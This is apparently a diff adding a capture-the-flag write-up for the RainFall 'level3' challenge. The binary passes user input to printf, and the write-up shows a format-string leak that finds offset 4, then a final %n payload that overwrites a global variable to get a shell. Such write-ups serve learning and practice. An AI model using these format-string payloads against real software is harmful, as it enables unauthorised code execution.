@@ -1,0 +1,24 @@
+it call fgets on 512 buffer then send it to printf and check if the global variable m is equal to 0x40, if so we get a shell otherwise it quit
+
+we can exploit printf format by sending whatever we want
+
+python -c 'print "AAAA" + "\x8c\x98\x04\x08" + "BBBB" + "%x " * 10' | ./level3
+
+%x leak us memory address
+i send 0x0804988c between 'AAAA' and 'BBBB"
+
+level3@RainFall:~$ python -c 'print "AAAA" + "\x8c\x98\x04\x08" + "BBBB" + "%x " * 10' | ./level3
+AAAA�BBBB200 b7fd1ac0 b7ff37d0 41414141 804988c 42424242 25207825 78252078 20782520 25207825
+
+we can see that between 41414141(A) and 42424242 there is our address which is the address of m variable see (info variables gdb
+
+that's also mean we found our offset which is 4
+
+we can then print the number of bytes writen to this address with %n
+
+final one 
+
+cat <(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"') - | ./level3
+
+
+
